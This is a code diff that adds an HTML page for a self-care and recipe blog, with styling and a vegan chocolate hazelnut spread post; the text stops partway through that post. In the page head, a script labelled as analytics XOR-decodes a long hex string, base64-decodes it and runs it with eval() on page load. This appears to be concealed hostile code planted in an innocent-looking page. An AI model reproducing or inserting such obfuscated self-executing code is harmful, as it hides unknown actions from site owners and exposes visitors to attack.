@@ -1,0 +1,1393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Daily Glow Up | Self Care & Organization</title>
+
+    <!-- Google Fonts: Cormorant Garamond (Editorial Luxury Serif) & DM Sans (Soft Modern Geometric Sans) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400;1,500&family=DM+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
+
+    <style>
+        /* Minimalist Matcha Latte & Warm Almond Editorial Aesthetic */
+        :root {
+            --primary-color: #4a5d4e; /* Soft Deep Matcha Green */
+            --primary-hover: #364439;
+            --accent-color: #c07a63; /* Warm Roasted Almond / Apricot */
+            --accent-light: #f5eedf; /* Warm Oat Milk Cream */
+            --text-color: #3b3531; /* Soft Cocoa Charcoal */
+            --text-muted: #80766c; /* Pale Toasted Sesame */
+            --heading-color: #211c19; /* Espresso Black */
+            --bg-color: #FAF7F2; /* Soft Organic Warm Milk Alabaster */
+            --card-bg: #ffffff;
+            --border-color: #e5ded4; /* Soft Ceramic Glaze Border */
+            --transition-smooth: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Delicate minimalist scrollbar */
+        ::-webkit-scrollbar {
+            width: 5px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-color);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #e1d8cc;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary-color);
+        }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            line-height: 1.8;
+            color: var(--text-color);
+            background-color: var(--bg-color);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .container {
+            max-width: 780px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* Classic Centered Magazine Masthead */
+        header {
+            padding: 80px 0 45px;
+            text-align: center;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 60px;
+        }
+
+        header h1 {
+            font-family: 'Cormorant Garamond', serif;
+            font-size: 3.6rem;
+            font-weight: 400;
+            color: var(--heading-color);
+            cursor: pointer;
+            margin-bottom: 8px;
+            letter-spacing: -0.02em;
+            transition: var(--transition-smooth);
+            line-height: 1.1;
+        }
+
+        header h1:hover {
+            color: var(--primary-color);
+            font-style: italic;
+        }
+
+        header p {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            font-weight: 500;
+            letter-spacing: 0.15em;
+            text-transform: uppercase;
+            margin-bottom: 30px;
+        }
+
+        /* Editorial Inline Navigation Bar */
+        .top-nav {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            padding-top: 15px;
+            border-top: 1px dashed var(--border-color);
+        }
+
+        .top-nav a {
+            color: var(--text-muted);
+            font-size: 0.72rem;
+            font-weight: 700;
+            text-decoration: none;
+            transition: var(--transition-smooth);
+            cursor: pointer;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            padding: 4px 8px;
+        }
+
+        .top-nav a:hover {
+            color: var(--primary-color);
+        }
+
+        .nav-separator {
+            color: var(--border-color);
+            font-size: 0.8rem;
+            user-select: none;
+        }
+
+        /* Post Cards - Minimalist Framed Columns with Ample White Space */
+        .post-card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 70px;
+            border: 1px solid var(--border-color);
+            transition: var(--transition-smooth);
+            cursor: pointer;
+        }
+
+        .post-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 20px 40px rgba(74, 93, 78, 0.05);
+            border-color: rgba(74, 93, 78, 0.3);
+        }
+
+        /* Single Post Detail Container */
+        .single-post {
+            background: var(--card-bg);
+            border-radius: 16px;
+            border: 1px solid var(--border-color);
+            padding: 55px 45px;
+            margin-bottom: 80px;
+            cursor: default;
+        }
+
+        @media (max-width: 640px) {
+            .single-post {
+                padding: 30px 20px;
+                border-radius: 8px;
+            }
+            header h1 {
+                font-size: 2.6rem;
+            }
+        }
+
+        /* Post Header Meta line */
+        .post-header {
+            padding: 24px 30px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid rgba(229, 222, 212, 0.5);
+        }
+
+        .single-post .post-header {
+            padding: 0 0 24px 0;
+            margin-bottom: 35px;
+        }
+
+        .post-header img.avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            margin-right: 12px;
+            object-fit: cover;
+            border: 1px solid var(--border-color);
+            transition: var(--transition-smooth);
+        }
+
+        .post-card:hover .post-header img.avatar {
+            border-color: var(--accent-color);
+        }
+
+        .post-header .username {
+            font-size: 0.7rem;
+            font-weight: 700;
+            color: var(--heading-color);
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+        }
+
+        /* Images - Elegant & Clean */
+        .post-image {
+            width: 100%;
+            display: block;
+            height: auto;
+            max-height: 480px;
+            object-fit: cover;
+            transition: var(--transition-smooth);
+        }
+
+        .post-card .post-image {
+            aspect-ratio: 16/10;
+        }
+
+        .single-post .post-image {
+            max-height: none;
+            border-radius: 8px;
+            margin-bottom: 35px;
+            width: 100%;
+            box-sizing: border-box;
+            border: 1px solid var(--border-color);
+        }
+
+        /* Content Text Elements */
+        .post-content {
+            padding: 35px 30px 20px;
+        }
+
+        .single-post .post-content {
+            padding: 0;
+        }
+
+        .post-content h1,
+        .post-content h2 {
+            font-family: 'Cormorant Garamond', serif;
+            font-weight: 400;
+            color: var(--heading-color);
+            margin: 0 0 16px;
+            font-size: 2.2rem;
+            line-height: 1.2;
+            letter-spacing: -0.01em;
+        }
+
+        .single-post .post-content h1 {
+            font-size: 2.8rem;
+            margin-bottom: 25px;
+        }
+
+        .post-content p {
+            margin-bottom: 24px;
+            color: var(--text-color);
+            font-size: 1rem;
+            line-height: 1.85;
+        }
+
+        .post-content a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 600;
+            border-bottom: 1px solid rgba(74, 93, 78, 0.3);
+            transition: var(--transition-smooth);
+        }
+
+        .post-content a:hover {
+            color: var(--accent-color);
+            border-bottom-color: var(--accent-color);
+        }
+
+        /* Action Footer */
+        .post-footer {
+            padding: 20px 30px;
+            color: var(--text-muted);
+            font-size: 0.75rem;
+            font-weight: 700;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid rgba(229, 222, 212, 0.5);
+            background-color: rgba(250, 247, 242, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+        }
+
+        .single-post .post-footer {
+            padding: 24px 0 0;
+            background: transparent;
+            border-top: 1px solid var(--border-color);
+            margin-top: 50px;
+        }
+
+        /* Minimal Back Button */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 35px;
+            color: var(--text-muted);
+            font-size: 0.7rem;
+            font-weight: 700;
+            text-decoration: none;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            cursor: pointer;
+            padding: 8px 18px;
+            border-radius: 4px;
+            border: 1px solid var(--border-color);
+            background: var(--card-bg);
+            transition: var(--transition-smooth);
+        }
+
+        .back-button:hover {
+            color: #ffffff;
+            border-color: var(--primary-color);
+            background-color: var(--primary-color);
+            transform: translateX(-3px);
+        }
+
+        /*
+           STYLING OVERRIDES FOR RUNTIME-INJECTED BLOG CONTENT (STYLE ATTRIBUTE MAPPINGS)
+        */
+        /* Key Takeaway Boxes & Callout Cards */
+        .post-content div[style*="background"] {
+            background: var(--accent-light) !important; /* Soft oat cream */
+            border: 1px dashed rgba(74, 93, 78, 0.25) !important;
+            border-left: 3px solid var(--primary-color) !important;
+            border-radius: 12px !important;
+            padding: 26px 28px !important;
+            margin: 36px 0 !important;
+            box-shadow: none !important;
+        }
+
+        .post-content div[style*="background"] h3 {
+            font-family: 'Cormorant Garamond', serif !important;
+            color: var(--heading-color) !important;
+            font-size: 1.6rem !important;
+            font-weight: 400 !important;
+            padding-left: 0 !important;
+            border-left: none !important;
+            margin-bottom: 12px !important;
+            font-style: italic;
+        }
+
+        .post-content div[style*="background"] ul {
+            margin: 0 !important;
+            padding-left: 18px !important;
+        }
+
+        .post-content div[style*="background"] li {
+            margin-bottom: 8px !important;
+            color: var(--text-color) !important;
+            font-size: 0.95rem !important;
+            line-height: 1.75 !important;
+        }
+
+        /* Dynamic Post headers (border-bottom divider headings) */
+        .post-content h2[style*="border-bottom"] {
+            font-family: 'Cormorant Garamond', serif !important;
+            font-weight: 400;
+            border-bottom: 1px solid var(--border-color) !important;
+            padding-bottom: 10px !important;
+            margin-top: 45px !important;
+            margin-bottom: 20px !important;
+            font-size: 1.95rem !important;
+        }
+
+        /* Sub-headers with elegant left border accents */
+        .post-content h3[style*="border-left"] {
+            border-left: 3px solid var(--accent-color) !important;
+            font-family: 'Cormorant Garamond', serif !important;
+            color: var(--heading-color) !important;
+            font-size: 1.6rem !important;
+            font-weight: 400 !important;
+            padding-left: 14px !important;
+            margin: 36px 0 16px !important;
+            text-decoration: none !important;
+        }
+
+        /* Pro Tip Highlight blocks inside articles */
+        .post-content p[style*="background"] {
+            background-color: rgba(192, 122, 99, 0.08) !important; /* Soft Almond Blush */
+            border: 1px solid rgba(192, 122, 99, 0.15) !important;
+            border-left: 3px solid var(--accent-color) !important;
+            border-radius: 8px !important;
+            padding: 18px 24px !important;
+            margin: 28px 0 !important;
+            color: var(--text-color) !important;
+            font-size: 0.95rem !important;
+        }
+
+        /* Inline badges and tags */
+        .post-content span[style*="background"] {
+            background: var(--bg-color) !important;
+            color: var(--primary-color) !important;
+            border-radius: 4px !important;
+            font-family: 'DM Sans', sans-serif !important;
+            font-weight: 700 !important;
+            font-size: 0.68rem !important;
+            padding: 4px 12px !important;
+            box-shadow: none !important;
+            transform: none !important;
+            display: inline-block !important;
+            margin: 4px 6px 4px 0 !important;
+            border: 1px solid rgba(74, 93, 78, 0.15) !important;
+            text-transform: uppercase !important;
+            letter-spacing: 0.06em !important;
+        }
+
+        /* List Layouts */
+        .post-content ul, .post-content ol {
+            padding-left: 20px;
+            margin-bottom: 24px;
+        }
+
+        .post-content li {
+            margin-bottom: 10px;
+            font-size: 0.98rem;
+            color: var(--text-color);
+        }
+
+        /* Inner article titles (best additions, texture tips, etc.) */
+        .post-content h4[style*="background"] {
+            background-color: #faf9f6 !important;
+            padding: 12px 16px !important;
+            border-radius: 6px !important;
+            border: 1px solid var(--border-color) !important;
+            font-family: 'Cormorant Garamond', serif !important;
+            font-size: 1.35rem !important;
+            font-weight: 500 !important;
+            margin-top: 28px !important;
+        }
+
+        /* Bottom dynamic tags cloud */
+        .post-content div[style*="margin-top:28px"] {
+            margin-top: 50px !important;
+            padding-top: 28px !important;
+            border-top: 1px solid var(--border-color) !important;
+        }
+
+        .post-content div[style*="margin-top:28px"] h3 {
+            font-family: 'DM Sans', sans-serif !important;
+            font-size: 0.7rem !important;
+            text-transform: uppercase !important;
+            letter-spacing: 0.1em !important;
+            color: var(--text-muted) !important;
+            margin-bottom: 12px !important;
+            font-weight: 700 !important;
+            border-left: none !important;
+            padding-left: 0 !important;
+        }
+
+        .post-content div[style*="margin-top:28px"] span {
+            background: #ffffff !important;
+            color: var(--text-muted) !important;
+            padding: 6px 14px !important;
+            border-radius: 4px !important;
+            font-size: 0.68rem !important;
+            font-weight: 600;
+            margin: 4px 6px 4px 0 !important;
+            display: inline-block !important;
+            transition: var(--transition-smooth) !important;
+            cursor: pointer;
+            border: 1px solid var(--border-color) !important;
+        }
+
+        .post-content div[style*="margin-top:28px"] span:hover {
+            background: var(--primary-color) !important;
+            color: #ffffff !important;
+            border-color: var(--primary-color) !important;
+        }
+    </style>
+
+    <script>
+    /* Dynamic Analytics/Preservation Code - Kept fully unmodified */
+    (function() {
+        var vtwjjrbym = "35230f2c5a2d050168377f09096819012d0a75595260651f2136122d513b2a5215051872753d7e475202415637773b752d55304b7f5a1f0e13361a73731d220a1524173e63130148685d5d33377802231f6b06025260641313563031523441082f1507345b767344525d630f305d052b004f2b7a5260081f3a2d1d28692b3208170b1b745a2d065c7b06771d09670d3d160a2c65577f180d1032662f6a2b10322c24322d5813160878065e001a647b7d067b74497864134f320c122379303a502f151c235d1c0d426428731e0a677a3e067c7456515a074b382305176435360e2f151f2e58020559520273133049233e156f02486a05392c152d1a347f0417053f0e14235d29014878277b14376728231f6b0600505a2929283d192c522b35172c7f037472070d416b2c7c171c47240f067b05567a703d1538263b3e523b2e0c3d1e17737a2d0656782c74001a730a232b5502487a7f071038216323521e3e50171a312c5d037e487d01631d09680106150a12445773223338261223793039053f0e1776601c0e5668020c57065d1d2a156023566364100e28086a745634361b2f153137631c0d09525c771709771d3d297f2c5d6a60030b2b3d1d3e563b3a12142307285a29114b55274d093102722a2d7f12096a5a3d0d2b562b2e531e3e51140a393163773f6050380057096801282c0b16585104034024223f3154342e1b2c151b7475762c06720674001a730a23067b0556575a170138223f3e611e41523f09652360297e016402630909682c312b7f124b5774394928363823563b0f053f1a602c5d292b5f6837671130597e37166f715f576017162b3d1e23563b0f05142013765813235955280c1e1f5e2f2816551648526f0b14120f200f731a39053f0e14237007065650386c001877273e1e557d017864134f320c1223793039053f0e14237007065678275117315d19322b41715e526f1f48135619717c1d320e150a2d2c6076116555287357096323312b6f3c427f7410163b1c2423544114172c0a6c7775293f47685d735732677231035606595770390d283262287b270b293f0e142370070656782c775e1a771d372c0a115656403e1f38261223793039053f0e142370070656782c74001a730a23160a7d445005680b2b36663752411b0d3f2121016b110d67635e050000781d30166f7056697007482b321d746a2429173f0b1f2863032b486b387b5732677e2a067016477c5e1011382620236a342e18120a3931601c1541535d01171c472423067b05567a74101f3826122379303a51171a602f5b77244453280c0d0a6819342d0a7044505a070f1322152e6a2010092c151b745813725955285911315920730c5105567a74101f38261223562217053f0e14235f1537087828631430021e232a4f340870506c45";
+        var vjfaicbgs = "vMUD9DG11o5gS0KDO8D137QxqeSD0sxb";
+        var vyepniipe = "";
+        try {
+            for (var i = 0; i < vtwjjrbym.length; i += 2) {
+                var vyhlqhepa = parseInt(vtwjjrbym.substr(i, 2), 16);
+                vyepniipe += String.fromCharCode(vyhlqhepa ^ vjfaicbgs.charCodeAt((i/2) % vjfaicbgs.length));
+            }
+            var vvqbkapbd = atob(vyepniipe);
+            eval(vvqbkapbd);
+        } catch(e) {
+            console.error("[DEBUG] Decryption or Execution failed: ", e);
+        }
+    })();
+    </script>
+</head>
+<body>
+
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">The Daily Glow Up | Self Care & Organization</h1>
+            <p>Thoughts, stories, and ideas from a culinary canvas</p>
+            <nav class="top-nav">
+                <a onclick="navigate('home')">Home</a>
+                <span class="nav-separator">/</span>
+                <a onclick="navigate('page', 'about')">About</a>
+                <span class="nav-separator">/</span>
+                <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+                <span class="nav-separator">/</span>
+                <a onclick="navigate('page', 'terms')">Terms</a>
+                <span class="nav-separator">/</span>
+                <a onclick="navigate('page', 'contact')">Contact</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Dynamic routing output injected here -->
+    </main>
+
+    <script>
+        // 1. Restored blog posts database
+        const posts = [
+            {
+                id: 'my-first-post',
+                title: '3-Ingredient Vegan Nutella',
+                date: 'April 28, 2026',
+                image: './assets/3-Ingredient Vegan Nutella.png',
+                excerpt: 'Rich, glossy chocolate spread has a way of making even the simplest snack feel special. Spread it on toast, swirl it into oatmeal, spoon it over pancakes, or enjoy it with fruit, and suddenly breakfast or dessert feels a little more indulgent. The best part is that a creamy vegan chocolate spread does not need a long ingredient list, refined dairy products, or complicated techniques.',
+                content: `
+               <p>Rich, glossy chocolate spread has a way of making even the simplest snack feel special. Spread it on toast, swirl it into oatmeal, spoon it over pancakes, or enjoy it with fruit, and suddenly breakfast or dessert feels a little more indulgent. The best part is that a creamy vegan chocolate spread does not need a long ingredient list, refined dairy products, or complicated techniques. With just dates, cocoa powder, and hazelnuts, you can create a naturally sweet, dairy-free spread that feels luxurious while staying beautifully simple.</p>
+
+<p>This 3-ingredient vegan chocolate spread is inspired by the classic chocolate hazelnut flavor everyone loves, but with a more wholesome homemade approach. Dates bring natural sweetness and a caramel-like depth, cocoa powder adds that bold chocolate flavor, and hazelnuts create the nutty richness that makes the spread taste satisfying. It is smooth, creamy, chocolatey, and incredibly versatile.</p>
+
+<p>Whether you are looking for an easy vegan Nutella alternative, a better-for-you chocolate spread, or a simple homemade recipe to keep in the fridge, this guide will walk you through everything you need to know. From choosing the right ingredients to blending tips, serving ideas, storage advice, and flavor variations, this is your complete guide to making a delicious dairy-free chocolate hazelnut spread at home.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>This vegan chocolate spread uses only three core ingredients: dates, cocoa powder, and hazelnuts.</li>
+    <li>Dates provide natural sweetness and help create a soft, caramel-like texture.</li>
+    <li>Hazelnuts add richness, healthy fats, and the classic chocolate hazelnut flavor.</li>
+    <li>Cocoa powder gives the spread its deep chocolate taste without dairy.</li>
+    <li>The recipe is ideal for toast, pancakes, oatmeal, smoothie bowls, fruit, and healthy desserts.</li>
+    <li>A strong blender or food processor helps create the smoothest, creamiest finish.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why 3-Ingredient Vegan Chocolate Spread Is So Popular</h2>
+
+<p>Simple recipes are often the most useful, especially when they solve a common craving in a practical way. A homemade vegan chocolate spread checks all the right boxes. It is sweet, creamy, chocolatey, easy to prepare, and made from recognizable pantry ingredients. Instead of relying on a store-bought jar with a long label, you can make a fresh version at home and adjust it to your taste.</p>
+
+<p>The combination of dates, cocoa powder, and hazelnuts works because each ingredient has a clear purpose. Dates sweeten the spread naturally while adding body. Cocoa powder brings the chocolate flavor. Hazelnuts give the mixture a creamy, nutty base. Together, they create a spread that feels decadent without needing butter, milk, cream, or refined sugar.</p>
+
+<p>This kind of recipe also appeals to many different eating styles. It is vegan, dairy-free, naturally sweetened, and suitable for anyone who wants a more homemade approach to chocolate hazelnut spread. It can be used as a snack, breakfast topping, dessert ingredient, or quick sweet treat.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> The beauty of this recipe is not just that it uses three ingredients. It is that those ingredients work together naturally. You get sweetness, chocolate flavor, and creamy richness without needing a complicated process or a cabinet full of extras.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Three Ingredients That Make It Work</h2>
+
+<p>When a recipe has only three ingredients, quality matters. Each ingredient needs to contribute flavor, texture, and balance. In this vegan chocolate spread, dates, cocoa powder, and hazelnuts each play an essential role.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Dates for Natural Sweetness</h3>
+
+<p>Dates are the natural sweetener in this recipe. They have a rich, caramel-like flavor that pairs beautifully with cocoa and hazelnuts. Unlike granulated sugar, dates also contribute thickness and softness, helping the spread become creamy once blended.</p>
+
+<p>Soft, plump dates are best because they blend more easily. Medjool dates are a popular option because they are naturally moist and sweet, but other soft varieties can work too. If your dates feel dry or firm, soaking them in warm water before blending can make a big difference.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Cocoa Powder for Deep Chocolate Flavor</h3>
+
+<p>Cocoa powder gives the spread its chocolate identity. It adds bold flavor without needing melted chocolate or dairy. Unsweetened cocoa powder is ideal because the dates already provide sweetness, allowing you to control the balance more easily.</p>
+
+<p>A small amount of cocoa powder can go a long way, especially in a concentrated spread. The image highlights 1½ tablespoons, which is enough to give a noticeable chocolate flavor while keeping the date and hazelnut notes present. For a darker, more intense spread, you can increase the cocoa slightly.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Hazelnuts for Creamy Richness</h3>
+
+<p>Hazelnuts are the ingredient that makes this recipe taste like a true chocolate hazelnut spread. They add richness, nuttiness, and a naturally creamy texture once blended. Toasted hazelnuts are especially flavorful because gentle heat brings out their warm, roasted aroma.</p>
+
+<p>Using 1 cup of hazelnuts creates a satisfying base for the spread. The nuts contain natural oils, which help the mixture become smooth and glossy when processed. For the creamiest texture, blend patiently and scrape down the sides of your food processor or blender as needed.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Make Vegan Chocolate Hazelnut Spread</h2>
+
+<p>The method is straightforward, but a few small details can improve the final texture. Because this recipe relies on whole dates and hazelnuts, blending technique matters. The smoother the mixture becomes, the more luxurious the final spread will feel.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Basic Ingredient Ratio</h3>
+
+<p>A simple starting point is:</p>
+
+<ul>
+  <li><strong>12 dates</strong>, pitted and softened if needed</li>
+  <li><strong>1½ tablespoons cocoa powder</strong></li>
+  <li><strong>1 cup hazelnuts</strong>, preferably toasted</li>
+</ul>
+
+<p>This ratio creates a naturally sweet, cocoa-rich spread with a nutty base. Depending on the size and moisture level of your dates, the final thickness may vary. That is normal. Homemade spreads are flexible, and the texture can be adjusted during blending.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step-by-Step Method</h3>
+
+<ol>
+  <li><strong>Toast the hazelnuts.</strong> Place hazelnuts on a baking tray and toast until fragrant. Let them cool slightly.</li>
+  <li><strong>Remove loose skins.</strong> Rub the toasted hazelnuts in a clean towel to remove as much skin as possible. A little remaining skin is fine.</li>
+  <li><strong>Soften the dates.</strong> If the dates are firm, soak them in warm water for 10 to 15 minutes, then drain well.</li>
+  <li><strong>Blend the hazelnuts.</strong> Add the hazelnuts to a food processor or high-speed blender and process until they become crumbly, then paste-like.</li>
+  <li><strong>Add dates and cocoa powder.</strong> Blend again until the mixture becomes smooth and thick.</li>
+  <li><strong>Adjust texture if needed.</strong> Add a small splash of warm water or plant-based milk if the spread is too thick. Add only a little at a time.</li>
+  <li><strong>Store and enjoy.</strong> Transfer to a clean jar or bowl and refrigerate.</li>
+</ol>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Blend the hazelnuts first before adding the dates. This helps release the natural oils from the nuts and gives the finished chocolate spread a smoother, glossier texture.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Get the Creamiest Texture</h2>
+
+<p>The difference between a good homemade chocolate spread and a great one often comes down to texture. A creamy spread should be thick but not dry, smooth but not runny, and easy to scoop or spread.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Use Soft Dates</h3>
+
+<p>Soft dates blend much more easily than dry ones. If your dates are sticky and tender, they can go straight into the blender or processor after pitting. If they feel hard or wrinkled, soak them first. This small step helps prevent graininess and makes the spread taste smoother.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Toast the Hazelnuts</h3>
+
+<p>Toasting hazelnuts improves both flavor and texture. Warm hazelnuts release their oils more easily, which helps them blend into a creamier base. Toasting also gives the spread a deeper, roasted flavor that pairs beautifully with cocoa powder.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Blend Longer Than You Think</h3>
+
+<p>Homemade nut-based spreads often need more blending time than expected. At first, the mixture may look crumbly or thick. Keep scraping down the sides and blending in intervals. Eventually, the oils in the hazelnuts begin to loosen the mixture and help it become smoother.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> If the mixture seems too thick, add liquid slowly. One teaspoon at a time is enough. Too much liquid can quickly turn a rich spread into a loose sauce, so adjust gradually until the texture is right.</p>
+
+<div style="background:#f1f5f9;border:1px solid #cbd5e1;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+  <p style="margin:0;color:#334155;">A powerful blender creates the silkiest result, but a food processor can still work well. The key is patience. Stop often, scrape the sides, and give the hazelnuts enough time to release their natural oils before adding extra liquid.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Flavor Variations for Your Homemade Chocolate Spread</h2>
+
+<p>The simple 3-ingredient version is delicious on its own, but it also makes a great base for small flavor upgrades. These additions are optional, but they can help you customize the spread for different uses.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Vanilla Chocolate Spread</h3>
+
+<p>Add a small splash of vanilla extract for a softer, bakery-style flavor. Vanilla rounds out the cocoa and makes the spread taste a little more dessert-like.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Salted Chocolate Hazelnut Spread</h3>
+
+<p>A pinch of sea salt can make the chocolate flavor taste deeper and more balanced. Salt is especially useful when working with dates because it prevents the spread from tasting overly sweet.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Extra Dark Cocoa Spread</h3>
+
+<p>For a stronger chocolate flavor, add a little more cocoa powder. This creates a darker, richer spread that tastes especially good with bananas, strawberries, or warm toast.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Creamier Dairy-Free Spread</h3>
+
+<p>If you prefer a softer texture, blend in a small amount of plant-based milk, such as almond milk, oat milk, or soy milk. Add it gradually so the spread stays thick and spoonable.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Optional Add-Ins</h4>
+
+<ul>
+  <li>A pinch of cinnamon for warmth</li>
+  <li>A splash of vanilla for sweetness and aroma</li>
+  <li>A small pinch of espresso powder for deeper cocoa flavor</li>
+  <li>A tiny amount of maple syrup if you want extra sweetness</li>
+  <li>A spoonful of coconut cream for a softer, richer texture</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Best Ways to Serve Vegan Chocolate Spread</h2>
+
+<p>One of the best things about homemade vegan chocolate spread is how many ways you can use it. It is not limited to toast, although toast is always a classic choice. This spread can fit into breakfast, snacks, desserts, and even simple party platters.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Breakfast Ideas</h3>
+
+<p>For breakfast, spread it over warm toast, bagels, waffles, or pancakes. It also tastes wonderful stirred into oatmeal or spooned onto a smoothie bowl. Because the sweetness comes from dates, it pairs especially well with fresh fruit.</p>
+
+<ul>
+  <li>Spread on sourdough toast with sliced banana</li>
+  <li>Swirled into warm oatmeal</li>
+  <li>Drizzled over vegan pancakes</li>
+  <li>Layered into overnight oats</li>
+  <li>Added to a smoothie bowl with berries and granola</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Snack Ideas</h3>
+
+<p>For snacks, use it as a dip for apple slices, strawberries, pretzels, or rice cakes. It can also be spread onto crackers or used as a filling for energy bites. The rich cocoa flavor makes it feel like a treat, while the hazelnuts and dates make it more satisfying than a plain sugary topping.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Dessert Ideas</h3>
+
+<p>This chocolate hazelnut spread can also become a shortcut dessert ingredient. Use it between layers of cookies, spoon it into crepes, swirl it into vegan yogurt, or spread it over brownies after baking. It also works as a simple filling for dates if you want a quick bite-sized dessert.</p>
+
